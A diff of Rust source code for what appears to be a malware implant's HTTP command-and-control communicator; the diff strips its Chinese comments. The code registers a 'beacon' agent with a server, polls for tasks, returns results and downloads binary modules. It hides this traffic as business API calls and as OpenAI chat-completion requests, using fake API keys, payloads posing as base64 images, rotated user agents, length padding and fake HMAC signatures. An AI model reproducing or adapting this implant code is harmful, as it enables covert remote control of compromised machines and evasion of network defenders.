@@ -1,13 +1,5 @@
-//! HTTP communicator — 单入口内部路由（流量伪装 Phase 2）。
 //!
-//! 所有 beacon 流量 POST 到 profile 配置的单一入口路径，请求体为业务风格
-//! 外层壳：`{ "<data_key>": "<AES-GCM 密文>", "<ts_key>": <ms>, "<rand_key>": "<hex>" }`。
-//! 密文内部是路由信封 `BeaconEnvelope{op, id, data}`：
-//!   op=reg 注册（预会话密钥） / op=hb 心跳 / op=res 结果 / op=mod 模块下载
-//! agent 标识 token 位于密文内 —— 线路上无任何固定标识头、无可枚举功能路径。
 //!
-//! 密文长度随机化：明文尾部追加随机数量空白（JSON 解析容忍），
-//! 心跳/结果节奏与 UA 由 profile 控制。
 
 use libra_common::models::AgentTask;
 use libra_common::models::ProfileTransform;
@@ -22,15 +14,10 @@ const AES_KEY_SIZE: usize = 32;
 pub struct RegisterOutcome {
     pub agent_id: String,
     pub session_key: Option<Vec<u8>>,
-    /// 流量伪装 profile（单入口路径/壳字段/UA 列表/padding/节奏）。
     pub profile: Option<ProfileTransform>,
-    /// 会话 token（后续请求放入密文信封）。
     pub session_token: Option<String>,
-    /// 服务端 RSA 公钥（SPKI DER b64，构建注入）。
     pub server_public_key: String,
-    /// 心跳间隔（毫秒，profile 或服务端下发值；0 = 保持构建时值）。
     pub heartbeat_interval_ms: u64,
-    /// 抖动百分比（0 = 保持构建时值）。
     pub jitter_percent: f64,
 }
 
@@ -38,13 +25,10 @@ pub struct RegisterOutcome {
 pub struct HttpCommunicator {
     client: Client,
     server_url: String,
-    /// 单入口路径前缀（注册前用构建时 register_path，注册后切换 profile.entry_path）。
     entry_path: String,
     profile: Option<ProfileTransform>,
     session_token: Option<String>,
-    /// 服务端 RSA 公钥（构建注入）：注册/协商混合加密用；空 = 旧式明文/单入口注册。
     server_public_key: String,
-    /// beacon secret（HMAC 假签名的 key；注册时保存）。
     beacon_secret: String,
     ua_index: std::sync::atomic::AtomicUsize,
 }
@@ -89,14 +73,10 @@ impl HttpCommunicator {
         self.profile = Some(profile);
     }
 
-    /// 设置服务端 RSA 公钥（构建注入）：注册混合加密用。
     pub fn set_server_public_key(&mut self, key: String) {
         self.server_public_key = key;
     }
 
-    /// 构建时注入的请求样式（UA 列表/附加头/路径后缀）。
-    /// 在注册**前**生效（注册请求本身也带伪装），不改变入口路径；
-    /// 注册后服务端 profile 会整体覆盖。
     pub fn set_build_style(
         &mut self,
         user_agents: Vec<String>,
@@ -113,7 +93,6 @@ impl HttpCommunicator {
         p.extra_headers = extra_headers;
     }
 
-    /// 应用 profile 附加头到请求（格式 "Name: value"）。
     fn apply_extra_headers(&self, req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
         let mut req = req;
         if let Some(p) = self.profile.as_ref() {
@@ -130,12 +109,10 @@ impl HttpCommunicator {
         req
     }
 
-    /// 注册端点（注册时 entry_path 尚未切换为 profile 入口，即构建时 register_path）。
     fn register_url(&self) -> String {
         format!("{}{}", self.server_url, self.entry_path)
     }
 
-    /// 本次请求的完整 URL：入口前缀 + 随机虚假业务后缀（profile 配置）。
     fn entry_url(&self) -> String {
         let suffix = self
             .profile
@@ -161,7 +138,6 @@ impl HttpCommunicator {
         }
     }
 
-    /// 按 profile 轮换 UA（无 profile 时用 client 默认 UA）。
     fn pick_user_agent(&self) -> Option<String> {
         let p = self.profile.as_ref()?;
         if p.user_agents.is_empty() {
@@ -173,7 +149,6 @@ impl HttpCommunicator {
         Some(p.user_agents[idx % p.user_agents.len()].clone())
     }
 
-    /// 密文长度随机化：明文尾部追加随机空白（JSON 解析容忍），然后 AES-GCM 加密。
     fn pad_and_encrypt(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
         let (pmin, pmax) = self
             .profile
@@ -194,8 +169,6 @@ impl HttpCommunicator {
         libra_crypto::encrypt_payload(&padded, key)
     }
 
-    /// 构造单入口请求：外层壳 + 密文 + 假签名 + 会话 token。
-    /// `inner_plain` 为密文内部的 JSON（信封），`key` 为加密密钥。
     fn build_body(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
         let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
 
@@ -224,8 +197,6 @@ impl HttpCommunicator {
         };
         let token = self.session_token.clone().unwrap_or_default();
 
-        // 假签名：HMAC-SHA256(beacon_secret, ts|cipher) 的 hex —— 真实算法，
-        // 与带鉴权的业务 API 结构一致；服务端宽松校验（失败不拒绝）。
         let sign = if !sk.is_empty() && !self.beacon_secret.is_empty() {
             Some(hmac_sign(
                 &self.beacon_secret,
@@ -235,7 +206,6 @@ impl HttpCommunicator {
             None
         };
 
-        // sid 字段仅在存在会话 token 时附带（注册请求无 token）
         let with_token = format!(r#","{}":"{}""#, sidk, token);
         let token_part = if token.is_empty() {
             String::new()
@@ -255,7 +225,6 @@ impl HttpCommunicator {
         }
     }
 
-    /// 发送单入口 POST 请求并返回响应体文本。
     async fn post_envelope(&self, body: String) -> Result<(u16, String), String> {
         let mut req = self.client.post(self.entry_url()).body(body);
         if let Some(ua) = self.pick_user_agent() {
@@ -267,15 +236,8 @@ impl HttpCommunicator {
         Ok((status, text))
     }
 
-    // ── AI 通道（v1/chat/completions + SSE）─────────────────────────
-
-    /// 通过 AI 通道发送信封并等待 SSE 响应，返回解密后的响应明文。
     ///
-    /// 请求伪装为 chat.completions 调用：
     ///   POST /v1/chat/completions
-    ///   Authorization: Bearer sk-<随机>
-    ///   {"model":"<真实模型名>","stream":true,"messages":[{"role":"user","content":"<密文>"}]}
-    /// 响应为 SSE 流：data: {choices:[{delta:{content:"<密文分块>"}}]} ... data: [DONE]
     async fn post_ai(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> Result<String, String> {
         let (ai_path, models, auth_prefix) = self
             .profile
@@ -290,7 +252,6 @@ impl HttpCommunicator {
             .unwrap_or(("/v1/chat/completions", &[][..], "sk-"));
 
         let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
-        // 伪装：content 以 data:image/jpeg;base64, 开头（AI 图片分析请求，海量正常流量）
         let content = format!("data:image/jpeg;base64,{}", cipher_b64);
         let model = if models.is_empty() {
             "gpt-4o-mini"
@@ -336,7 +297,6 @@ impl HttpCommunicator {
             return Err(format!("AI channel request failed: {status}"));
         }
 
-        // SSE 解析：聚合 data: 行中的 delta.content（base64 密文分块），[DONE] 结束
         let mut cipher = String::new();
         for line in text.lines() {
             let line = line.trim();
@@ -359,9 +319,6 @@ impl HttpCommunicator {
         libra_crypto::decrypt_payload(&cipher, key)
     }
 
-    /// 打开 SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=）。
-    /// 服务端挂起连接并主动推送任务（AES-GCM 密文在 data: 行），
-    /// 30s 注释 keepalive。调用方流式读取 body 逐行解析；401 = 会话丢失。
     pub async fn open_events(
         &self,
         _key: &[u8; AES_KEY_SIZE],
@@ -388,7 +345,6 @@ impl HttpCommunicator {
         Ok(resp)
     }
 
-    /// 注册：op=reg，预会话密钥加密（无会话密钥时的 bootstrap）。
     pub async fn register(
         &mut self,
         hostname: &str,
@@ -421,8 +377,6 @@ impl HttpCommunicator {
             if has_session_key { "true" } else { "false" }
         );
 
-        // 有服务端公钥：走 /api/v1/session OAuth 风格混合加密注册。
-        // 无公钥（dev 直连/旧构建）：无 secret 时明文旧端点；有 secret 时单入口预会话加密。
         let (status, resp_body) = if !self.server_public_key.is_empty() {
             let (enc_key, cipher_body) =
                 libra_crypto::hybrid_encrypt(&reg_json, &self.server_public_key)
@@ -443,7 +397,6 @@ impl HttpCommunicator {
             let text = resp.text().await.map_err(|e| e.to_string())?;
             (status, text)
         } else if beacon_secret.is_empty() {
-            // 明文注册（无 secret 且无公钥的开发环境）：旧端点
             let resp = self
                 .client
                 .post(self.register_url())
@@ -466,8 +419,6 @@ impl HttpCommunicator {
             return Err(format!("Registration failed with status: {status}"));
         }
 
-        // 注册响应：agent_id 等字段在明文 JSON 中（注册响应不含敏感数据），
-        // session_key/profile 从对应字段读取。
         let v: Value =
             serde_json::from_str(&resp_body).map_err(|e| format!("bad register response: {e}"))?;
 
@@ -494,7 +445,6 @@ impl HttpCommunicator {
             self.session_token = Some(t.clone());
         }
 
-        // profile 解析（服务端未下发时保持默认）
         let profile: Option<ProfileTransform> = v
             .get("profile")
             .and_then(|p| serde_json::from_value(p.clone()).ok());
@@ -522,7 +472,6 @@ impl HttpCommunicator {
         })
     }
 
-    /// 心跳：op=hb，走 AI 通道。返回 (待执行任务, 是否需要实时 WS 通道)。
     pub async fn heartbeat(
         &self,
         _agent_id: &str,
@@ -554,7 +503,6 @@ impl HttpCommunicator {
         Ok(task)
     }
 
-    /// 提交任务结果：op=res，走 AI 通道。
     pub async fn submit_result(
         &self,
         _agent_id: &str,
@@ -570,7 +518,6 @@ impl HttpCommunicator {
         Ok(())
     }
 
-    /// 模块下载：op=mod，走 AI 通道（模块名在密文内，线路上不可见）。
     pub async fn download_module(
         &self,
         name: &str,
@@ -581,7 +528,6 @@ impl HttpCommunicator {
         let inner = serde_json::json!({ "op": "mod", "id": token, "data": format!(r#"{{"name":"{}"}}"#, escape(name)) })
             .to_string();
 
-        // 响应密文内容是 base64 的模块二进制
         let plain = self.post_ai(&inner, session_key).await?;
         use base64::Engine as _;
         base64::engine::general_purpose::STANDARD
@@ -596,7 +542,6 @@ fn escape(s: &str) -> String {
     libra_common::json_util::escape_json(s)
 }
 
-/// HMAC-SHA256 hex（假签名）。
 fn hmac_sign(secret: &str, msg: &str) -> String {
     use hmac::{Hmac, Mac};
     use sha2::Sha256;
